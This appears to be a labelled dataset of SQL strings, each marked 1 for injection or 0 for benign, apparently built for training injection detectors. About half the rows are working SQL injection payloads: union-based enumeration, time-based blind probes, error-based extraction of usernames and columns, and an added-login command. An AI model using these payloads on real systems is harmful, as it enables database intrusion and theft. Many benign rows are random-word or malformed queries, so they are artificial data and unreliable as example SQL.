1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'hmqq'  =  'hmqq;1
"SELECT created_at, user_id, id FROM logs WHERE user_id = 'john@example.com';";0
SELECT * FROM die WHERE ball = 'edge';0
SELECT * FROM swing;0
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#;1
"INSERT INTO logs (id, quantity, created_at, status) VALUES (123, 123, 'active', 456);";0
"INSERT INTO customers (user_id, quantity, name) VALUES ('Sample text', 123, 456);";0
-8432  )   union all select 8169,8169,8169,8169,8169,8169,8169,8169,8169,8169--;1
1%'   )    )     )   union all select null,null,null#;1
1   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --;1
"1""   )    )     )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --";1
"UNION SELECT @@VERSION,SLEEP(5),""'3";1
-5596'   )    )     )   union all select 4877,4877,4877,4877,4877,4877,4877,4877,4877,4877--;1
-7812'  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'ttvo'  =  'ttvo;1
AND 1=1#;1
SELECT * FROM keep WHERE wheel = 'sharp' LIMIT 3;0
or 1  =  1 or ''  =  ';1
-5218  )   union all select 9677,9677#;1
1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  ;1
ORDER BY 12--;1
" select * from users where id  =  1 or 1#""{ union select 'a',version  (    )   -- 1";1
1'   )    )    as mdtm where 1393  =  1393 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --;1
"UPDATE employees SET description = 'pending' WHERE created_at = 123;";0
select case when 6558  =  4327 then 1 else null end--;1
SELECT Employees.minute, COUNT ( Orders.statementID )  AS telephoneFROM    ( OrdersINNER JOIN wash ON Orders.hitID  =  Employees.comeID ) ;0
"1"" or elt  (  5873  =  5873,sleep  (  5   )    )   #";1
1   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  7484  =  7484;1
-8224'  )   where 6504  =  6504 or 2461  =  5660;1
"1"" or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""ncym"" like ""ncym";1
"SELECT * FROM duty WHERE topic BETWEEN ""card"" AND    ""equipment""";0
AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)));1
SELECT * FROM consist WHERE at  BETWEEN 10 AND 20;0
""" or sleep  (  __TIME__  )  #";1
"1%""   )    )    waitfor delay '0:0:5' and    (    (   ""%""  =  """;1
1%'  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  '%'  =  ';1
-5661'   )    )    union all select 3011,3011#;1
1'+  (  select 'yjpp' where 8966  =  8966;1
-4817 union all select 7415,7415,7415,7415,7415,7415,7415,7415,7415#;1
"-6890""   )    )     )   union all select 1115#";1
SELECT find,stick,maybe,never,fix     (  (  fat JOIN program ON now.interest =  community.shut )   INNER JOIN planningON Orders.gone =  cookies.riseID ) ;0
"1""  )   where 8196  =  8196";1
"-6803""  )   order by 1#";1
SELECT * FROM dried  WHERE worse = or;0
"-8841%""  )   or 4361  =  1910";1
"1""   )    )    as rcse where 4559  =  4559 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --";1
1  )   where 5465  =  5465 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --;1
SELECT AVG ( Price ) FROM seeing;0
1'+  (  select luwn where 1214  =  1214 union all select null,null,null,null,null,null#;1
1'  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'iixp'  =  'iixp;1
SELECT missing FROM dot;0
exec sp_addlogin 'name' , 'password';1
select   (  case when   (  2593  =  3592  )   then 2593 else 2593*  (  select 2593 from information_schema.character_sets  )   end  )  #;1
SELECT bad, us, flame FROM putting WHERE string  IS NULL;0
SELECT customs, they+ ', ' + go+ ' ' + diameter+ ', ' + horse AS ride  FROM growth;0
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i;1
1  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ;1
SELECT * FROM cotton WHERE kids NOT IN  ( 'within', 'connected', 'pattern' )  ;0
SELECT * FROM dropped ORDER BY bank ASC, fog DESC;0
' OR '1;1
SELECT canal,nose FROM empty WHERE plastic = 'eleven' UNION SELECT steep, cattle FROM heart;0
"1""   )    )     )   and 4595  =  4595#";1
-7371'  )   union all select 4531,4531,4531#;1
1'   )    )    as cjjm where 1981  =  1981;1
SELECT * FROM press WHERE heat BETWEEN '1996-07-01' AND '1996-07-31';0
INSERT INTO division  ( suggest, build, wire )  VALUES  ( 'triangle', 'stopped', 'would' )  ;0
1'+  (  select wpai where 3685  =  3685;1
select * from users where id  =  '1' <@&1 union select 1,version  (    )   -- 1';1
"-3443""   )    )    union all select 4043,4043,4043,4043,4043,4043,4043#";1
(  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ;1
SELECT * FROM slowly WHERE metal BETWEEN '1996-07-01' AND '1996-07-31';0
"1""   )    )    union all select null,null,null,null,null,null,null,null#";1
1  )   where 7485  =  7485 and make_set  (  8403  =  8403,8899  )  --;1
"1""   )    )    as qvyu where 5962  =  5962 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --";1
select * from users where id  =  1 union select 1a,banner from v$version where rownum  =  1 -- 1;1
"UPDATE products SET price = 123 WHERE price = 'john@example.com';";0
"SELECT name FROM inventory WHERE id = 'pending';";0
SELECT careful,tail,weight FROM wrote LEFT JOIN Orders ON eager.dogID =  past.fine ORDER BY recent.tea;0
" select * from users where id  =  1 or ""&  (  "" or 1  =  1 -- 1";1
"select sleep  (  5  )   and   (  ""innk""  =  ""innk";1
"-9881""   )    )    or 9850  =  8118#";1
1   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   5524  =  5524;1
"1""  )   where 3507  =  3507";1
1'   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --;1
" select * from users where id  =  1 or "";@"" or 1  =  1 -- 1";1
SELECT brave FROM tongue UNION ALL SELECT ought FROM business ORDER BY specific;0
-8234'   )    )     )   or 9323  =  9323#;1
"1""   )    )     )   waitfor delay '0:0:5'--";1
"INSERT INTO users (price, created_at, description) VALUES ('john@example.com', '2023-01-01', 456);";0
SELECT wrote, none, frequentlyFROM settle WHERE against  IS NOT NULL;0
SELECT foot FROM uncle UNION SELECT given FROM tales ORDER BY out;0
"SELECT description, name FROM employees WHERE price = 'pending';";0
SELECT number ( s )  FROM here FULL OUTER JOIN;0
"1""  )   where 7723  =  7723 and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --";1
"SELECT description, email, quantity, name FROM products WHERE description = 'user123';";0
FROM  ( SELECT DISTINCT tool FROM try ) ;0
SELECT bush ( s )  FROM weigh UNION;0
select * from users where id  =  '1' or <. union select 1,@@VERSION -- 1';1
1%'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --;1
select * from users where id  =  '1' union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1';1
"1""  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  ""ubvd""  =  ""ubvd";1
SELECT * FROM double ORDER BY steam ASC, breeze DESC;0
SELECT COUNT ( particular ) FROM kitchen;0
1'  )   where 4949  =  4949;1
"1""  )   as rnjx where 2679  =  2679 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #";1
1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ;1
-5032' or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ;1
"SELECT * FROM around WHERE laugh BETWEEN ""research"" AND    ""greatly""";0
1   )    )    union all select null,null,null,null--;1
select * from users where id  =  1 *1 union select 1,banner from v$version where rownum  =  1 -- 1;1
"INSERT INTO sessions (status, quantity) VALUES ('pending', 'pending');";0
SELECT graph ( s )  FROM many SELECT properly ( s ) ;0
select * from users where id  =  '1' <@$_ or 1  =  1 -- 1';1
1%'  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  '%'  =  ';1
AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i;1
select * from users where id  =  1 *. union select null,@@VERSION -- 1;1
SELECT fed,kill FROM flew WHERE wing = 'pile' UNION SELECT larger, fireplace FROM dry;0
"DELETE FROM logs WHERE status = 'user123';";0
1   )    )     )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --;1
SELECT adventure AS soon, facing AS [apple]  FROM choose;0
INSERT INTO thumb ( poem, silence, tonight, active, shoot, fort )  VALUES  ( 'clothing', 'shore'. canal', 'vapor', 'task', 'either', 'unless' )  ;0
"-7553%"" or 3571  =  2886";1
"1""  )   union all select null,null,null,null#";1
"1""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""thkh"" like ""thkh";1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10#;1
SELECT * FROM  ( SELECT view FROM shallow ) ;0
-9202' where 9799  =  9799 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --;1
select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'pwuy'  =  'pwuy;1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7;1
SELECT COUNT ( DISTINCT final )  FROM fifty;0
"UPDATE sessions SET user_id = 'user123' WHERE status = 'Sample text';";0
"DELETE FROM products WHERE name = '2023-01-01';";0
SELECT * FROM dawn WHERE men IN  ( 'determine', 'valuable', 'improve' )  ;0
UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22;1
SELECT Orders.againrID, Employees.might, Employees.religious FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.fightID ORDER BY Orders.structureID;0
" select * from users where id  =  1 or 1#""$ union select 'a',version  (    )   -- 1";1
.s;1
HAVING 1=0--;1
SELECT * FROM throat ORDER BY cake DESC;0
1'+  (  select 'arzm' where 6464  =  6464 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )     )  +';1
1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'xmnd'  =  'xmnd;1
INSERT INTO north ( living, surface, author, desk, straw, sit )  VALUES  ( 'fuel', 'strip'. which', 'trick', 'instrument', 'weigh', 'inch' )  ;0
select * from users where id  =  1 union select +!<@,version  (    )   -- 1;1
"1""   )    )    and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --";1
SELECT MIN ( market )  AS powerful FROM cover;0
1'||  (  select 'tfqg' from dual where 9862  =  9862 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #;1
SELECT COUNT ( famous ) , sentence FROM explain BY shallow;0
1' and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --;1
1' in boolean mode  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  #;1
SELECT TOP 3 * FROM second WHERE region = 'expect' SELECT * FROM hard;0
SELECT COUNT ( wise ) FROM draw;0
1' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and 'rtbm'  =  'rtbm;1
1'   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --;1
SELECT * FROM room WHERE uncle LIKE '%pond%';0
"1""   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --";1
"INSERT INTO orders (id, description, price, user_id) VALUES ('pending', 'active', 'Sample text', 'john@example.com');";0
"1""   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #";1
"1""   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #";1
"1""  )   where 5698  =  5698 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --";1
SELECT * FROM rest;0
"1"" where 2035  =  2035 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --";1
"1234 "" AND 1=0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055";1
"admin"" or 1=1";1
SELECT COUNT ( usID ) FROM blind;0
"-9944""   )    )    or 8537  =  2039 and    (    (   ""kfzj""  =  ""kfzj";1
SELECT DISTINCT children FROM were;0
"1"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ";1
select sleep  (  5  ) ;1
UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#;1
SELECT MIN ( toy )  AS near FROM greatest;0
"UPDATE employees SET user_id = 'john@example.com' WHERE user_id = 'active';";0
"-5622"" where 7970  =  7970 union all select 7970,7970,7970,7970,7970--";1
-3462'   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   'cxku' like 'cxku;1
""")) or pg_sleep(5)--";1
SELECT Employees.birthday, COUNT ( Orders.forceID )  AS clubFROM    ( OrdersINNER JOIN smell ON Orders.blackID  =  Employees.boundID ) ;0
"1""  )   union all select null,null,null,null,null,null--";1
"1%""   )    )    and 2006  =  2006";1
SELECT Orders.strugglerID, Employees.brief, Employees.favorite FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.leafID ORDER BY Orders.grabbedID;0
1%' and   (  3020  =  3020  )  *6703 and '%'  =  ';1
-5158'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   'noaj' like 'noaj;1
SELECT * FROM good WHERE at NOT IN  ( 'share', 'kids', 'frozen' )  ;0
SELECT * FROM even WHERE enjoy = 'frighten';0
" end and    (    (     (  ""zpii"" like ""zpii";1
SELECT shut, brought, flyFROM gravity WHERE floating  IS NOT NULL;0
ORDER BY SLEEP(5)#;1
SELECT * FROM rubber 3 SELECT * FROM average;0
SELECT * FROM tales;0
select sleep  (  5  )   and    (    (   'mmvf' like 'mmvf;1
ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9;1
1'||  (  select 'jnsd' from dual where 2316  =  2316 union all select null,null,null,null,null,null,null#;1
1 union all select null,null,null,null,null,null--;1
select   (  case when   (  4690  =  4373  )   then 4690 else 1/  (  select 0  )   end  )  --;1
SELECT * FROM dollar WHERE right NOT IN  ( 'inside', 'dear', 'melted' )  ;0
SELECT TOP 3 * FROM face WHERE coming = 'suggest';0
-4347' union all select 6074,6074,6074,6074,6074,6074,6074--;1
SELECT share, spider, plates FROM easy WHERE making  IS NULL;0
"1""  )   where 1330  =  1330 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --";1
-5124'+  (  select 'xpww' where 1752  =  1752 union all select 1752,1752,1752,1752,1752,1752,1752,1752,1752,1752--;1
# Numeric;1
-4557 or 6872  =  6872-- kkte;1
"UPDATE users SET user_id = 'active' WHERE email = 'pending';";0
SELECT sugar FROM imagine UNION ALL SELECT pull FROM composition ORDER BY die;0
' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --;1
1%'   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   '%'  =  ';1
pg_sleep(5)--;1
1 where 7224  =  7224 and sleep  (  5  )  #;1
1  )   where 8164  =  8164 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --;1
"1""  )   as tecq where 4817  =  4817 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --";1
UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28;1
